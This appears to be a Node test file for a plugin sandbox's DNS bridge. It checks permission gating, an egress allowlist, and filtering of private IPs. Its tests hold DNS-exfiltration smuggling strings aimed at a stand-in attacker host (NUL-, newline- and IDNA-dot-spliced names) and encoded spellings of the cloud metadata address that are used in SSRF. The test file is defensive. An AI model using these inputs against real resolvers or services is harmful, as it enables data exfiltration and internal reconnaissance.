/**
 * Host-mediated DNS bridge (api.dns) — the fix for the sandbox denying a plugin the raw c-ares
 * resolver surface (dns.resolve*), which broke the mail server's MX/TXT resolution.
 *
 * Verifies: (1) the network GATE — the bridge refuses DNS without the `network` grant; (2) real
 * MX/TXT/A resolution works WITH the grant; (3) resolve4/resolve6 STRIP private/internal IPs so the
 * bridge can't be used for internal DNS recon. The real-network parts skip gracefully offline.
 */
import { test } from 'node:test';
import assert from 'node:assert';

const { createPluginApi } = require('../core/plugin-api');
const perms = require('../core/plugin-permissions');

const SLUG = 'test-dns-mailer';

test('api.dns REFUSES resolution without the network grant', async () => {
    perms._setGrantsInMemory(SLUG, []); // declared-but-not-granted / not granted
    const api = createPluginApi(SLUG);
    await assert.rejects(() => api.dns.resolveMx('gmail.com'), /network/i, 'resolveMx gated');
    await assert.rejects(() => api.dns.resolveTxt('gmail.com'), /network/i, 'resolveTxt gated');
    await assert.rejects(() => api.dns.resolve4('gmail.com'), /network/i, 'resolve4 gated');
});

// Synthetic resolver: every record type answers without touching the network, and records which name
// was actually queried — so the allowlist assertions below are deterministic and offline.
function stubResolver() {
    const dnsP = require('dns').promises;
    const orig = { resolveMx: dnsP.resolveMx, resolveTxt: dnsP.resolveTxt, resolve4: dnsP.resolve4, resolve6: dnsP.resolve6 };
    const queried: string[] = [];
    dnsP.resolveMx = async (n: string) => { queried.push(n); return [{ exchange: `mx.${n}`, priority: 10 }]; };
    dnsP.resolveTxt = async (n: string) => { queried.push(n); return [['v=spf1 -all']]; };
    dnsP.resolve4 = async (n: string) => { queried.push(n); return ['8.8.8.8']; };
    dnsP.resolve6 = async (n: string) => { queried.push(n); return ['2606:4700:4700::1111']; };
    return { queried, restore: () => Object.assign(dnsP, orig) };
}

// Runs BEFORE any test installs a policy: in this process nothing has loaded plugin_egress_hosts yet,
// which is exactly the "policy unavailable" state the spawn path fails CLOSED on (egressDenyAll).
test('api.dns fails CLOSED while the egress policy is not loaded (no lookup leaves the host)', async () => {
    assert.strictEqual(perms.isEgressPolicyLoaded(), false, 'precondition: no policy loaded in this process');
    perms._setGrantsInMemory(SLUG, ['network']);
    const api = createPluginApi(SLUG);
    const r = stubResolver();
    try {
        for (const m of ['resolveMx', 'resolveTxt', 'resolve4', 'resolve6', 'resolve']) {
            await assert.rejects(() => api.dns[m]('example.com'), /egress allowlist/i, `${m} must refuse`);
        }
        assert.deepEqual(r.queried, [], 'no query was sent');
    } finally { r.restore(); }
});

test('api.dns applies the plugin egress ALLOWLIST to the NAME for every method (MX/TXT included)', async () => {
    perms._setGrantsInMemory(SLUG, ['network']);
    perms._setEgressAllowlistInMemory(SLUG, ['vendor.example']);
    const api = createPluginApi(SLUG);
    const r = stubResolver();
    try {
        // Off-allowlist: refused BEFORE the query — a lookup of `<secret>.attacker.example` is itself
        // egress to the attacker's authoritative server, and MX/TXT answers carry no IP to filter.
        for (const m of ['resolveMx', 'resolveTxt', 'resolve4', 'resolve6', 'resolve']) {
            await assert.rejects(() => api.dns[m]('leak.attacker.example'), /egress allowlist/i, `${m} off-allowlist`);
        }
        // Not a substring match: `evilvendor.example` is not under `vendor.example`.
        await assert.rejects(() => api.dns.resolveTxt('evilvendor.example'), /egress allowlist/i);
        assert.deepEqual(r.queried, [], 'no off-allowlist name ever reached the resolver');

        // On-allowlist (the host itself or a subdomain at a label boundary): answered.
        assert.deepEqual(await api.dns.resolveMx('vendor.example'), [{ exchange: 'mx.vendor.example', priority: 10 }]);
        assert.deepEqual(await api.dns.resolveTxt('_dmarc.vendor.example'), [['v=spf1 -all']]);
        assert.deepEqual(await api.dns.resolve4('api.vendor.example'), ['8.8.8.8']);
        assert.deepEqual(await api.dns.resolve6('api.vendor.example'), ['2606:4700:4700::1111']);
        assert.deepEqual(await api.dns.resolve('vendor.example.'), ['8.8.8.8']);

        // An EMPTY allowlist keeps today's behaviour: every public name may be resolved.
        perms._setEgressAllowlistInMemory(SLUG, []);
        assert.deepEqual(await api.dns.resolveTxt('anything.example'), [['v=spf1 -all']]);

        // The network grant is still required on top of the allowlist.
        perms._setGrantsInMemory(SLUG, []);
        await assert.rejects(() => api.dns.resolveMx('vendor.example'), /network/i);
    } finally {
        r.restore();
        perms._setEgressAllowlistInMemory(SLUG, []);
    }
});

test('api.dns: a NUL in the name cannot carry an off-allowlist query past the allowlist', async () => {
    // c-ares takes the name as a C string and stops at the first NUL, so
    // `<data>.leak.attacker.example\u0000.vendor.example` ends in `.vendor.example` for the allowlist and
    // is QUERIED as `<data>.leak.attacker.example` — at the attacker's authoritative nameserver. The JSON
    // IPC bridge keeps \u0000, so the isolated plugin can send exactly this string.
    perms._setGrantsInMemory(SLUG, ['network']);
    perms._setEgressAllowlistInMemory(SLUG, ['vendor.example']);
    const api = createPluginApi(SLUG);
    const r = stubResolver();
    try {
        const smuggled = [
            'c2VjcmV0.leak.attacker.example\u0000.vendor.example',
            'leak.attacker.example\u0000vendor.example',
            'vendor.example\u0000',
            'leak.attacker.example\n.vendor.example',
        ];
        for (const name of smuggled) {
            for (const m of ['resolveMx', 'resolveTxt', 'resolve4', 'resolve6', 'resolve']) {
                await assert.rejects(() => api.dns[m](name), /Security Block/, `${m}(${JSON.stringify(name)})`);
            }
        }
        // Outside the hostname alphabet the allowlist cannot judge the name the resolver will query.
        await assert.rejects(() => api.dns.resolveTxt('leak.attacker.example\\.vendor.example'), /egress allowlist/i, 'backslash escape');
        await assert.rejects(() => api.dns.resolveTxt('leak.attacker.example．vendor.example'), /egress allowlist/i, 'IDNA-mapped dot');
        assert.deepEqual(r.queried, [], 'no smuggled name ever reached the resolver');

        // With NO allowlist the plugin may resolve any public name, but still never a control character.
        perms._setEgressAllowlistInMemory(SLUG, []);
        await assert.rejects(() => api.dns.resolveTxt('anything.example\u0000.x'), /control characters/i);
        assert.deepEqual(r.queried, []);
        assert.deepEqual(await api.dns.resolveTxt('anything.example'), [['v=spf1 -all']], 'a plain name still resolves');
    } finally {
        r.restore();
        perms._setEgressAllowlistInMemory(SLUG, []);
    }
});

test('api.dns resolves MX/TXT/A with the network grant and strips private IPs', async (t) => {
    perms._setGrantsInMemory(SLUG, ['network']);
    const api = createPluginApi(SLUG);

    let mx: any[];
    try {
        mx = await api.dns.resolveMx('gmail.com');
    } catch (e: any) {
        return t.skip('DNS unavailable in this environment: ' + (e && e.message));
    }
    assert.ok(Array.isArray(mx) && mx.length > 0, 'gmail.com has MX records');
    assert.ok(mx[0].exchange && typeof mx[0].priority === 'number', 'MX record shape preserved');

    // The MX host must resolve to PUBLIC addresses only (private-IP answers are stripped host-side).
    const ips = await api.dns.resolve4(mx[0].exchange);
    assert.ok(Array.isArray(ips) && ips.length > 0, 'MX host resolves to at least one public A record');
    for (const ip of ips) {
        assert.ok(
            !/^(10\.|127\.|192\.168\.|169\.254\.|0\.)/.test(ip) &&
            !/^172\.(1[6-9]|2\d|3[01])\./.test(ip) &&
            !/^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(ip),
            `resolve4 returned a private IP (${ip}) — the SSRF filter failed`
        );
    }

    // TXT resolution (SPF/DKIM/DMARC verification path). gmail.com publishes SPF.
    const txt = await api.dns.resolveTxt('gmail.com');
    assert.ok(Array.isArray(txt), 'resolveTxt returns an array of chunk arrays');
    const flat = txt.map((chunks: any) => (Array.isArray(chunks) ? chunks.join('') : String(chunks)));
    assert.ok(flat.some((r: string) => /v=spf1/i.test(r)), 'gmail.com SPF record is readable via the bridge');
});

test('api.dns.resolve4 drops answers for an internal name (no recon)', async (t) => {
    perms._setGrantsInMemory(SLUG, ['network']);
    const api = createPluginApi(SLUG);
    // localhost resolves to 127.0.0.1 / ::1 — both must be stripped, so the bridge yields nothing.
    let out: string[];
    try {
        out = await api.dns.resolve4('localhost');
    } catch (e: any) {
        // Some resolvers refuse/deny 'localhost' via c-ares (NOTFOUND) — that's also a non-leak.
        return t.skip('localhost not resolvable via resolver: ' + (e && e.message));
    }
    assert.deepEqual(out, [], 'loopback answer stripped — no internal IP handed to the plugin');
});

// Network-free proof that the private-IP filter delegates to egress-guard's isBlockedIp, which
// classifies by NUMERIC bytes. Each of these forms was LEAKED by the previous hand-rolled filter
// (textual prefix-match / dotted-only ::ffff regex / missing multicast+reserved+NAT64+6to4+fec0).
// We inject synthetic resolver answers so the assertion is deterministic and offline.
test('api.dns strips every private-IP spelling via isBlockedIp (synthetic resolver)', async () => {
    perms._setGrantsInMemory(SLUG, ['network']);
    const dnsP = require('dns').promises;
    const origR4 = dnsP.resolve4;
    const origR6 = dnsP.resolve6;
    const api = createPluginApi(SLUG);
    try {
        dnsP.resolve4 = async () => [
            '8.8.8.8',              // public — must survive
            '10.0.0.5', '127.0.0.1', '169.254.169.254', '172.16.0.1', '192.168.1.1', '100.64.0.1',
            '224.0.0.1',            // multicast   — hand-rolled MISSED
            '240.0.0.1',            // reserved    — hand-rolled MISSED
            '192.0.0.1',            // IETF protocol assignments — hand-rolled MISSED
        ];
        assert.deepEqual(await api.dns.resolve4('x.test'), ['8.8.8.8'], 'v4: only the public address survives');
        assert.deepEqual(await api.dns.resolve('x.test'), ['8.8.8.8'], 'resolve() shares the v4 filter');

        dnsP.resolve6 = async () => [
            '2606:4700:4700::1111', // public (Cloudflare) — must survive
            '::1',                  // loopback
            '0:0:0:0:0:0:0:1',      // loopback, fully expanded — hand-rolled string-match MISSED
            '::ffff:a9fe:a9fe',     // hex-form IPv4-mapped 169.254.169.254 metadata — hand-rolled MISSED
            '64:ff9b::a9fe:a9fe',   // NAT64-wrapped metadata — hand-rolled MISSED
            '2002:0a00:0001::',     // 6to4-wrapped 10.0.0.1 — hand-rolled MISSED
            'fe80::1',              // link-local
            'fec0::1',              // deprecated site-local — hand-rolled MISSED
            'fc00::1',              // ULA
            'ff02::1',              // multicast — hand-rolled MISSED
        ];
        assert.deepEqual(await api.dns.resolve6('x.test'), ['2606:4700:4700::1111'], 'v6: only the public address survives');
    } finally {
        dnsP.resolve4 = origR4;
        dnsP.resolve6 = origR6;
    }
});
